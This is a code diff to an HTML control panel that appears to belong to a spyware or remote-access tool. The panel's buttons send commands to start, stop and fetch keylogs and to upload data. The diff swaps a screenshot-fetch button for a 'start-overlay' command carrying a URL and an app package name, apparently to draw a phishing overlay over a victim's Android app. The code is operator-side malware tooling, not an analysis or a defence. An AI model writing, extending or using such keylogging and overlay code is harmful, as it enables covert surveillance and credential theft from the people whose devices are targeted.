@@ -67,7 +67,7 @@
   <button class="fetch" id="btnStartKeyLog">Start KeyLogs</button>
   <button class="close" id="btnStopKeyLog">Stop KeyLogs</button>
   <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
-  <button class="fetch" id="btnFetchScreenshot">Fetch Screenshot</button>
+  <button class="fetch" id="btnStartOverlay">Start Overlay</button>
   <button class="upload" id="btnUpload">Upload</button>
   <button class="close" id="btnClose">Close</button>
 
@@ -121,7 +121,7 @@
     document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
     document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
     document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
-    document.getElementById("btnFetchScreenshot").onclick = () => sendCmd("fetch-screenshot");
+    document.getElementById("btnStartOverlay").onclick = () => sendCmd("start-overlay{url:https://google.com,PackageName:com.example.notifcollector}");
     document.getElementById("btnUpload").onclick = () => sendCmd("upload");
     document.getElementById("btnClose").onclick = () => window.close();
 
